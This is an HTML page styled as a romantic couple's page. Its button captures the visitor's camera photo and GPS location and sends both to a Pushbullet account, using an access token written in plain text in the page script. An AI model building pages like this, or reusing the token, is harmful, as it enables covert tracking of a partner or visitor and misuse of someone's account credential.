<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Yago & Emily</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #2a003f, #4b004e);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background-color: #1c0b25;
      padding: 30px;
      border-radius: 20px;
      max-width: 600px;
      width: 90%;
      box-shadow: 0 0 30px rgba(255, 0, 128, 0.3);
      text-align: center;
    }
    .btn-captura {
      margin-top: 20px;
      padding: 12px 25px;
      font-size: 1em;
      border: none;
      border-radius: 10px;
      background-color: #ff69b4;
      color: white;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      transition: 0.3s;
    }
    .btn-captura:hover {
      background-color: #ff1493;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Yago & Emily</h1>
    <p><strong>Tudo come√ßou em:</strong> 21/02/2025</p>
    <button class="btn-captura">üì∏ Capturar Foto e Localiza√ß√£o</button>
  </div>

<script>
const PUSHBULLET_TOKEN = "o.IWXCk9EGij01IeY6unzB33nu1A7xOMOA";

document.querySelector(".btn-captura").addEventListener("click", capturar);

async function capturar() {
  try {
    // ===== 1. Captura da c√¢mera =====
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Foto em blob
    const blob = await new Promise(res => canvas.toBlob(res, "image/png"));

    // Para a c√¢mera
    stream.getTracks().forEach(track => track.stop());

    // ===== 2. Captura da localiza√ß√£o =====
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;

      // ===== 3. Upload da foto no Pushbullet =====
      const uploadReq = await fetch("https://api.pushbullet.com/v2/upload-request", {
        method: "POST",
        headers: {
          "Access-Token": PUSHBULLET_TOKEN,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ file_name: "foto.png", file_type: "image/png" })
      });

      const uploadData = await uploadReq.json();

      // Enviar a imagem para o link tempor√°rio
      const formData = new FormData();
      for (const [key, value] of Object.entries(uploadData.data)) {
        formData.append(key, value);
      }
      formData.append("file", blob);

      await fetch(uploadData.upload_url, {
        method: "POST",
        body: formData
      });

      // ===== 4. Enviar push com imagem e localiza√ß√£o =====
      await fetch("https://api.pushbullet.com/v2/pushes", {
        method: "POST",
        headers: {
          "Access-Token": PUSHBULLET_TOKEN,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          type: "file",
          file_name: "foto.png",
          file_type: "image/png",
          file_url: uploadData.file_url,
          body: `üìç Localiza√ß√£o: ${linkMaps}`
        })
      });

      alert("‚úÖ Foto e localiza√ß√£o enviadas para o Pushbullet!");
    }, err => {
      alert("Erro ao obter localiza√ß√£o: " + err.message);
    });

  } catch (e) {
    alert("Erro: " + e.message);
  }
}
</script>
</body>
</html>
